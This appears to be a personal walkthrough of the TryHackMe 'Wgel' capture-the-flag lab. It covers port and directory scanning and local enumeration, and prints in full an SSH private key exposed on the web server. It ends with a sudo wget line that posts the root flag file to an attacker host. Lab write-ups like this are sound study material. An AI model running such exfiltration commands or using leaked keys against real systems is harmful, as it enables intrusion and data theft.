@@ -1,0 +1,387 @@
+Name: Wgel
+Date: 14/01/2022
+Difficulty: Easy
+Description: Can you exfiltrate the root flag?
+Better Description: The actual is PrivEsc is weird Facepalm
+Goals: Practice manaul PrivEsc
+Learnt: I need to build various wordpress, apache, sites from scratch at some point.
+
+
+root@ip-10-10-214-243:~# nmap -sC -sV -O -T 4 -p- 10.10.118.100
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-14 16:21 GMT
+Warning: 10.10.118.100 giving up on port because retransmission cap hit (6).
+Nmap scan report for ip-10-10-118-100.eu-west-1.compute.internal (10.10.118.100)
+Host is up (0.0060s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
+|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
+|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (EdDSA)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 02:F6:40:B1:15:F7 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/14%OT=22%CT=1%CU=30946%PV=Y%DS=1%DC=D%G=Y%M=02F640%T
+OS:M=61E1AA23%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=I%TS=A
+OS:)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5
+OS:=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W
+OS:6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
+OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
+OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
+OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
+OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
+OS:I=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1811.15 seconds
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.35 seconds
+
+root@ip-10-10-214-243:~# nikto -h 10.10.118.100
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.118.100
++ Target Hostname:    ip-10-10-118-100.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-01-14 16:22:49 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x2c6e 0x595ca55640d0c 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2022-01-14 16:23:11 (GMT0) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@ip-10-10-214-243:~# gobuster dir -u http://10.10.118.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.118.100
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/14 16:22:51 Starting gobuster
+===============================================================
+/sitemap (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2022/01/14 16:23:17 Finished
+===============================================================
+
+comment on source of :
+view-source:http://10.10.118.100/
+ <!-- Jessie don't forget to udate the webiste -->
+
+I have not built apache web apps but apparently according DesKel, a file is missing and the a peak reveals recursive gobuster scanning of /sitemap
+
+root@ip-10-10-214-243:~# gobuster dir -u http://10.10.118.100/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.118.100/sitemap
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/14 17:21:49 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/sass (Status: 301)
+===============================================================
+2022/01/14 17:22:13 Finished
+===============================================================
+root@ip-10-10-214-243:~# gobuster dir -u http://10.10.118.100/sitemap/sass -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.118.100/sitemap/sass
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/14 17:22:52 Starting gobuster
+===============================================================
+/bootstrap (Status: 301)
+===============================================================
+2022/01/14 17:23:15 Finished
+===============================================================
+
+Lesson learnt: rotate your wordlists:
+
+root@ip-10-10-214-243:~# gobuster dir -u http://10.10.118.100/sitemap -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.118.100/sitemap
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/14 17:24:55 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.ssh (Status: 301)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/js (Status: 301)
+===============================================================
+2022/01/14 17:24:55 Finished
+===============================================================
+
+/sitemap/.ssh/id_rsa
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
+m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
+W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
+y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
++J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
+Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
+/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
+AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
+M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
+SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
+2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
+p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
+7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
+dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
+GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
+shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
+uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
+LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
+QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
+V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
+hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
+9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
+eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
+QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
+jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
+-----END RSA PRIVATE KEY-----
+
+copy into a new file
+chmod 600 id_rsa
+ssh -i id_rsa jessie@ip
+
+jessie@CorpOne:~/Desktop$ id
+uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+user flag:
+jessie@CorpOne:~/Desktop$ find / -type f -name "*flag*" 2>/dev/null
+...
+/home/jessie/Documents/user_flag.txt
+
+jessie@CorpOne:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+jessie@CorpOne:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+jessie@CorpOne:~$ ls -la /etc/hosts
+-rw-r--r-- 1 root root 222 oct 26  2019 /etc/hosts
+
+jessie@CorpOne:~$ getcap -r 2>/dev/null
+jessie@CorpOne:~$ 
+jessie@CorpOne:~$ find / -type f -perm -04000 -ls 2>/dev/null
+   261251     44 -rwsr-xr-x   1 root     root        43316 mai  7  2014 /bin/ping6
+   261250     40 -rwsr-xr-x   1 root     root        38932 mai  7  2014 /bin/ping
+   261162     28 -rwsr-xr-x   1 root     root        26492 oct 10  2019 /bin/umount
+   261212     36 -rwsr-xr-x   1 root     root        34812 oct 10  2019 /bin/mount
+   280369     40 -rwsr-xr-x   1 root     root        38900 mar 26  2019 /bin/su
+   261176     32 -rwsr-xr-x   1 root     root        30112 iul 12  2016 /bin/fusermount
+   267622    160 -rwsr-xr-x   1 root     root       159852 oct 11  2019 /usr/bin/sudo
+   268811     40 -rwsr-xr-x   1 root     root        39560 mar 26  2019 /usr/bin/chsh
+   268748     76 -rwsr-xr-x   1 root     root        74280 mar 26  2019 /usr/bin/chfn
+   269276     20 -rwsr-xr-x   1 root     root        18216 mar 27  2019 /usr/bin/pkexec
+   268767     52 -rwsr-xr-x   1 root     root        53128 mar 26  2019 /usr/bin/passwd
+   268778     80 -rwsr-xr-x   1 root     root        78012 mar 26  2019 /usr/bin/gpasswd
+   280365     36 -rwsr-xr-x   1 root     root        34680 mar 26  2019 /usr/bin/newgrp
+   529175     16 -rwsr-xr-x   1 root     root        13840 mar 18  2017 /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+   394789      8 -rwsr-xr-x   1 root     root         5480 mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+   531298    112 -rwsr-sr-x   1 root     root       113228 aug 20  2019 /usr/lib/snapd/snap-confine
+   533019     12 -rwsr-sr-x   1 root     root         9772 oct 25  2018 /usr/lib/xorg/Xorg.wrap
+   531596     16 -rwsr-xr-x   1 root     root        13960 mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   524903    504 -rwsr-xr-x   1 root     root       513528 mar  4  2019 /usr/lib/openssh/ssh-keysign
+   394336     48 -rwsr-xr--   1 root     messagebus    46436 iun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   394951    388 -rwsr-xr--   1 root     dip          396068 iun 12  2018 /usr/sbin/pppd
+
+jessie@CorpOne:~$ ls -la /etc/shadow
+-rw-r----- 1 root shadow 1273 oct 26  2019 /etc/shadow
+
+jessie@CorpOne:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-rwsr-xr-x 1 root root 43316 mai  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 38932 mai  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 26492 oct 10  2019 /bin/umount
+-rwsr-xr-x 1 root root 34812 oct 10  2019 /bin/mount
+-rwsr-xr-x 1 root root 38900 mar 26  2019 /bin/su
+-rwsr-xr-x 1 root root 30112 iul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 159852 oct 11  2019 /usr/bin/sudo
+-rwxr-sr-x 1 root crontab 38996 apr  6  2016 /usr/bin/crontab
+-rwsr-xr-x 1 root root 39560 mar 26  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 74280 mar 26  2019 /usr/bin/chfn
+-rwxr-sr-x 1 root tty 9788 mar  1  2016 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 61276 mar 26  2019 /usr/bin/chage
+-rwsr-xr-x 1 root root 18216 mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 53128 mar 26  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 78012 mar 26  2019 /usr/bin/gpasswd
+-rwxr-sr-x 1 root ssh 431632 mar  4  2019 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 34680 mar 26  2019 /usr/bin/newgrp
+-rwxr-sr-x 1 root tty 26356 oct 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root mlocate 34452 nov 18  2014 /usr/bin/mlocate
+-rwxr-sr-x 1 root shadow 22000 mar 26  2019 /usr/bin/expiry
+-rwxr-sr-x 1 root utmp 5480 mar 11  2016 /usr/lib/i386-linux-gnu/utempter/utempter
+-rwsr-xr-x 1 root root 13840 mar 18  2017 /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+-rwsr-xr-x 1 root root 5480 mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-sr-x 1 root root 113228 aug 20  2019 /usr/lib/snapd/snap-confine
+-rwsr-sr-x 1 root root 9772 oct 25  2018 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-x 1 root root 13960 mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwxr-sr-x 1 root mail 13680 mai 28  2019 /usr/lib/evolution/camel-lock-helper-1.2
+-rwsr-xr-x 1 root root 513528 mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 46436 iun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-- 1 root dip 396068 iun 12  2018 /usr/sbin/pppd
+-rwxr-sr-x 1 root shadow 38684 apr  9  2018 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 38664 apr  9  2018 /sbin/unix_chkpwd
+
+jessie@CorpOne:~$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+dev/char
+dev/fd
+dev/full
+dev/fuse
+dev/log
+dev/mqueue
+dev/net
+dev/null
+dev/ptmx
+dev/pts
+dev/random
+dev/shm
+dev/stderr
+dev/stdin
+dev/stdout
+dev/tty
+dev/urandom
+dev/zero
+home/jessie
+lib/systemd
+run/acpid.socket
+run/avahi-daemon
+run/cups
+run/dbus
+run/lock
+run/shm
+run/snapd-snap.socket
+run/snapd.socket
+run/systemd
+run/user
+run/uuidd
+sys/fs
+sys/kernel
+tmp
+tmp/.font-unix
+tmp/.ICE-unix
+tmp/.Test-unix
+tmp/.X11-unix
+tmp/.XIM-unix
+usr/share
+var/crash
+var/lib
+var/lock
+var/metrics
+var/tmp
+
+So after much pondering and looking. I went back to the DesKel writeup and learn a new manual privEsc.
+If you don't have the password for a user to sudo -l, which I negleted as I did not have the password to try sudo. You
+could just:
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http//attackbox:port
+
+Which is pretty cool. Thanks again DesKel.
+This was not covered on again of the privEsc room on linux on Tryhackme.. so.
+
+https://deskel.github.io/posts/thm/wgel-ctf.
